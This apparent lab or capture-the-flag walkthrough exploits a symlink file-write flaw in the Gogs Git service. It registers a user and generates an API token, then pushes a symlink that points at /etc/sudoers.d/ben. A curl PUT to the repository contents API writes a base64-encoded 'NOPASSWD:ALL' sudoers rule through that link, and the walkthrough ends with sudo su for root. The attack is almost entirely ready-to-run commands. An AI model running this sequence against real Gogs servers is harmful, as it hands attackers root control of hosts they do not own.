## Gogs Exploitation: Manual Method (Web UI)

If an attacker prefers a manual approach, the vulnerability can be exploited directly through the Gogs dashboard at `http://127.0.0.1:8080`.

1. **Account Setup:** Register a new user account (e.g., `<USERNAME>`).
    
2. **API Token Generation:** Navigate to **User Settings > Applications**. Under "Generate New Token," provide a name and click **Generate Token**. Save this token for API authentication.
    
3. **Repository Creation:** Create a new repository and ensure it is initialized.
    
4. **Symlink Creation (Local):** On your attacking machine, clone the repo, create a symlink pointing to the target file on the host, and push it:  
    
ON ATTACKER
```
git clone http://127.0.0.1:8080/<USERNAME>/<REPO>.git
```

ON ATTACKER
```
cd [repo]
```

ON ATTACKER
```
ln -s /etc/sudoers.d/ben malicious_link
```

ON ATTACKER
```
git add malicious_link && git commit -m "Add symlink" && git push
```


5. **Payload Delivery:** Use a tool like `curl` or Postman to send a `PUT` request to the Gogs API to update the content of `malicious_link`. This triggers the arbitrary write to the host's filesystem.

## ✅ Step 5.1 — Prepare payload (KALI)

echo -n 'ben ALL=(ALL) NOPASSWD:ALL' | base64

```
YmVuIEFMTD0oQUxMKSBOT1BBU1NXRDpBTEw=
```

---

## ✅ Step 5.2 — Send API request (KALI)

```
curl -X PUT http://127.0.0.1:3001/api/v1/repos/retric/test/contents/malicious_link \
-H "Authorization: token 81e6f4ad5372af52c64a24c69335f0e00547ebfc" \
-H "Content-Type: application/json" \
-d '{
  "message": "pwn-final",
  "content": "YmVuIEFMTD0oQUxMKSBOT1BBU1NXRDpBTEw="
}'
```

```
sudo -l
```

```
sudo su
```